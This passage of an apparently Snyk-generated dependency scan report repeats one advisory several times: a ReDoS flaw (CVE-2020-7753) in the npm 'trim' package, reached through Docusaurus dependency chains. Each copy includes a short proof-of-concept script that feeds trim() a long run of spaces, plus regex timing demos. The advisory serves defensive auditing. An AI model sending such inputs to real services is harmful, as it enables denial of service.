      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
